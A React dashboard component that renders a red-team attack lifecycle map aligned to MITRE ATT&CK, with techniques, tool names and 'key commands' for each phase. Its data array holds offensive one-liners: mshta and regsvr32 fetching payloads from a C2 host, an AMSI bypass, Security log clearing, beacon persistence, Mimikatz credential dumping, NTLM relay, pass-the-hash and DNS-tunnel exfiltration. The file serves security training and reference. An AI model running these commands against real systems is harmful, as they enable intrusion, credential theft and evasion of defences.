import { Box, Flex, Text, SimpleGrid } from '@chakra-ui/react';
import { ChevronRightIcon } from '@chakra-ui/icons';

const PHASES = [
  {
    id: 'recon',
    label: 'Recon',
    fullLabel: 'Reconnaissance',
    mitre: 'TA0043',
    color: '#9F7AEA',
    techniques: [
      'Passive OSINT — Shodan, Censys, FOFA, ZoomEye',
      'DNS enumeration — subfinder, amass, dnsx',
      'Email harvesting — theHarvester, hunter.io',
      'LinkedIn & social media profiling',
      'GitHub secrets — trufflehog, gitleaks',
      'Job postings → tech stack fingerprinting',
      'Certificate transparency — crt.sh, certspotter',
    ],
    tools: ['Maltego', 'Shodan', 'theHarvester', 'subfinder', 'amass', 'recon-ng', 'SpiderFoot'],
    cmd: 'subfinder -d target.com -o subs.txt\namass enum -passive -d target.com\ntheHarvester -d target.com -b all -f out.html',
  },
  {
    id: 'resource-dev',
    label: 'Resource Dev',
    fullLabel: 'Resource Development',
    mitre: 'TA0042',
    color: '#4FD1C5',
    techniques: [
      'Acquire & age domains (>6 months)',
      'Domain categorisation bypass',
      'SSL/TLS certificate provisioning',
      'C2 teamserver setup behind redirectors',
      'Redirector chain (Nginx/Apache mod_rewrite)',
      'Payload staging infrastructure',
      'Phishing infrastructure isolation',
    ],
    tools: ['Cobalt Strike', 'Havoc C2', 'Sliver', 'BruteRatel', 'Mythic', 'Metasploit'],
    cmd: 'certbot certonly --standalone -d c2.domain.com\nsocat TCP4-LISTEN:443,fork TCP4:teamserver:443',
  },
  {
    id: 'initial-access',
    label: 'Initial Access',
    fullLabel: 'Initial Access',
    mitre: 'TA0001',
    color: '#FC8181',
    techniques: [
      'Spearphishing — email, link, attachment',
      'Password spraying / credential stuffing',
      'External service exploitation (VPN, RDP, OWA)',
      'Evilginx2 / Modlishka AiTM phishing',
      'Supply chain & trusted relationship abuse',
      'Drive-by compromise via watering hole',
    ],
    tools: ['GoPhish', 'Evilginx2', 'Modlishka', 'CredMaster', 'kerbrute', 'TeamFiltration'],
    cmd: 'kerbrute passwordspray -d domain.com --dc dc01 users.txt Pass@2024\npython3 CredMaster.py --module okta -u users.txt -p pass.txt',
  },
  {
    id: 'execution',
    label: 'Execution',
    fullLabel: 'Execution',
    mitre: 'TA0002',
    color: '#F6AD55',
    techniques: [
      'PowerShell / cmd.exe',
      'MSHTA, Regsvr32, Rundll32 (LOLBins)',
      'WMI execution (wmic, wmiprvse)',
      'Scheduled Task / AT command',
      'Service creation & execution',
      'Windows Script Host (wscript, cscript)',
    ],
    tools: ['PowerShell Empire', 'PSExec', 'WMIExec', 'SCShell', 'LOLBAS'],
    cmd: 'mshta http://c2/payload.hta\nregsvr32 /s /n /u /i:http://c2/file.sct scrobj.dll\nwmic process call create "powershell -enc BASE64"',
  },
  {
    id: 'persistence',
    label: 'Persistence',
    fullLabel: 'Persistence',
    mitre: 'TA0003',
    color: '#ECC94B',
    techniques: [
      'Registry run keys / startup folder',
      'Scheduled tasks (schtasks)',
      'Service creation / modification',
      'DLL search-order hijacking',
      'COM object hijacking',
      'WMI event subscriptions',
      'Boot/Logon init scripts',
    ],
    tools: ['SharPersist', 'Persistence-Sniper', 'PowerSploit'],
    cmd: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svc /d "C:\\beacon.exe"\nschtasks /create /tn "WinUpdate" /tr C:\\beacon.exe /sc onlogon /ru SYSTEM',
  },
  {
    id: 'privesc',
    label: 'Priv Esc',
    fullLabel: 'Privilege Escalation',
    mitre: 'TA0004',
    color: '#F687B3',
    techniques: [
      'Token impersonation / theft',
      'Unquoted service paths',
      'Weak service / file permissions',
      'AlwaysInstallElevated MSI abuse',
      'PrintSpoofer / GodPotato / RoguePotato',
      'UAC bypass (fodhelper, eventvwr, sdclt)',
      'Kernel exploits (CVE-based)',
    ],
    tools: ['WinPEAS', 'PowerUp', 'BeRoot', 'PrintSpoofer', 'GodPotato', 'UACME'],
    cmd: '.\\winPEASany.exe quiet\n.\\GodPotato-NET4.exe -cmd "cmd /c whoami"\n.\\PrintSpoofer64.exe -i -c powershell',
  },
  {
    id: 'defense-evasion',
    label: 'Defense Evasion',
    fullLabel: 'Defense Evasion',
    mitre: 'TA0005',
    color: '#76E4F7',
    techniques: [
      'AMSI bypass (reflection patch, obfuscation)',
      'ETW patching (EtwEventWrite)',
      'Direct / indirect syscalls (SysWhispers)',
      'Process injection & hollowing',
      'Timestomping & artifact cleanup',
      'Disabling / tampering security tools',
      'Log clearing (wevtutil)',
    ],
    tools: ['Invoke-Obfuscation', 'Scarecrow', 'ThreatCheck', 'DefenderCheck', 'SysWhispers3'],
    cmd: '[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)\nwevtutil cl Security && wevtutil cl System && wevtutil cl Application',
  },
  {
    id: 'cred-access',
    label: 'Cred Access',
    fullLabel: 'Credential Access',
    mitre: 'TA0006',
    color: '#FBD38D',
    techniques: [
      'LSASS dump — Mimikatz, ProcDump, comsvcs.dll',
      'SAM / NTDS.dit extraction',
      'Kerberoasting & AS-REP Roasting',
      'LLMNR / NBT-NS poisoning',
      'NTLM relay attacks (Responder + ntlmrelayx)',
      'Credential vault & browser enumeration',
      'DPAPI secret extraction',
    ],
    tools: ['Mimikatz', 'Rubeus', 'Impacket', 'Responder', 'CrackMapExec', 'LaZagne'],
    cmd: 'sekurlsa::logonpasswords\n.\\Rubeus.exe kerberoast /outfile:hashes.txt\npython3 Responder.py -I eth0 -wrf\npython3 ntlmrelayx.py -tf targets.txt -smb2support',
  },
  {
    id: 'lateral',
    label: 'Lateral Movement',
    fullLabel: 'Lateral Movement',
    mitre: 'TA0008',
    color: '#68D391',
    techniques: [
      'Pass-the-Hash (PTH) via SMB / WMI',
      'Pass-the-Ticket (PTT) — Rubeus, Mimikatz',
      'OverPass-the-Hash → Kerberos TGT',
      'Remote service execution (PSExec, SCM)',
      'RDP hijacking (tscon.exe)',
      'SSH tunneling / SOCKS5 proxy',
      'DCOM lateral movement',
    ],
    tools: ['CrackMapExec', 'Impacket', 'Rubeus', 'Evil-WinRM', 'Cobalt Strike', 'ligolo-ng'],
    cmd: 'crackmapexec smb 10.10.0.0/24 -u admin -H HASH --sam\npython3 wmiexec.py -hashes :HASH domain/user@target\n.\\Rubeus.exe ptt /ticket:b64ticket',
  },
  {
    id: 'collection',
    label: 'Collection & Exfil',
    fullLabel: 'Collection & Exfiltration',
    mitre: 'TA0009/10',
    color: '#F6E05E',
    techniques: [
      'Email collection (Exchange, O365, MailSniper)',
      'File & directory enumeration (PowerView)',
      'Screen capture & keylogging',
      'Data staged in temp / encrypted containers',
      'DNS tunnelling exfiltration (dnscat2)',
      'HTTPS C2 channel exfiltration',
      'Cloud storage abuse (OneDrive, Dropbox)',
    ],
    tools: ['MailSniper', 'PowerView', 'DNSExfiltrator', 'dnscat2', 'exfiltkit'],
    cmd: 'Invoke-MailSearch -Terms "password,vpn,cred" -OutputCsv mail.csv\npython3 dnscat2.py --secret=s3cr3t exfil.domain.com',
  },
];

const PhaseChip = ({ phase, active }) => (
  <Box
    px={3} py="6px" borderRadius="8px" flexShrink={0}
    bg={`${phase.color}18`} border={`1px solid ${phase.color}40`}
    opacity={active ? 1 : 0.6}
    transition="opacity 0.15s"
  >
    <Text fontSize="10px" fontWeight="bold" color={phase.color} letterSpacing="wide" whiteSpace="nowrap">
      {phase.label}
    </Text>
    <Text fontSize="9px" color="var(--dash-text-muted)" mt="1px">{phase.mitre}</Text>
  </Box>
);

const ToolBadge = ({ label, color }) => (
  <Box
    px="6px" py="1px" borderRadius="4px" fontSize="9px" fontWeight="semibold"
    bg={`${color}14`} border={`1px solid ${color}30`} color={color}
    flexShrink={0}
  >
    {label}
  </Box>
);

const PhaseCard = ({ phase }) => (
  <Box
    bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
    borderRadius="12px" overflow="hidden"
  >
    <Box h="3px" bg={phase.color} />
    <Box p={4}>
      <Flex align="center" justify="space-between" mb={3}>
        <Text fontSize="13px" fontWeight="bold" color="var(--dash-text-primary)">
          {phase.fullLabel}
        </Text>
        <Box px="6px" py="1px" borderRadius="4px" fontSize="9px" fontWeight="bold"
          bg={`${phase.color}18`} border={`1px solid ${phase.color}35`} color={phase.color}>
          {phase.mitre}
        </Box>
      </Flex>

      <Box mb={3}>
        {phase.techniques.map((t, i) => (
          <Flex key={i} align="flex-start" gap={2} mb="4px">
            <Box w="4px" h="4px" borderRadius="full" bg={phase.color} mt="5px" flexShrink={0} />
            <Text fontSize="11px" color="var(--dash-text-secondary)" lineHeight="short">{t}</Text>
          </Flex>
        ))}
      </Box>

      <Flex gap={1.5} flexWrap="wrap" mb={3}>
        {phase.tools.map((t) => <ToolBadge key={t} label={t} color={phase.color} />)}
      </Flex>

      <Box bg="rgba(0,0,0,0.35)" borderRadius="8px" p={3} border="1px solid rgba(255,255,255,0.06)">
        <Text fontSize="9px" color="var(--dash-text-muted)" mb={1} letterSpacing="wider" textTransform="uppercase">
          Key Commands
        </Text>
        <Text fontFamily="mono" fontSize="10px" color="#a5f3fc" whiteSpace="pre-wrap" lineHeight="tall">
          {phase.cmd}
        </Text>
      </Box>
    </Box>
  </Box>
);

const RedTeamMapView = () => (
  <Box pb={8}>
    {/* Header */}
    <Box mb={6}>
      <Text fontSize="2xl" fontWeight="bold" color="var(--dash-text-primary)">
        Red Team Operations <Text as="span" color="red.400">Architecture Map</Text>
      </Text>
      <Text fontSize="12px" color="var(--dash-text-secondary)" mt={1}>
        Full attack lifecycle — MITRE ATT&CK aligned · techniques, tools & key commands per phase
      </Text>
    </Box>

    {/* Kill chain flow */}
    <Box
      bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
      borderRadius="12px" p={4} mb={6} overflowX="auto"
    >
      <Text fontSize="9px" color="var(--dash-text-muted)" textTransform="uppercase"
        letterSpacing="wider" mb={3}>
        Attack Kill Chain
      </Text>
      <Flex align="center" gap={1.5} flexWrap="nowrap" minW="max-content">
        {PHASES.map((phase, i) => (
          <Flex key={phase.id} align="center" gap={1.5}>
            <PhaseChip phase={phase} active />
            {i < PHASES.length - 1 && (
              <ChevronRightIcon boxSize={3} color="var(--dash-text-muted)" flexShrink={0} />
            )}
          </Flex>
        ))}
      </Flex>
    </Box>

    {/* Phase detail cards */}
    <SimpleGrid columns={{ base: 1, md: 2, xl: 3 }} gap={4}>
      {PHASES.map((phase) => <PhaseCard key={phase.id} phase={phase} />)}
    </SimpleGrid>
  </Box>
);

export default RedTeamMapView;
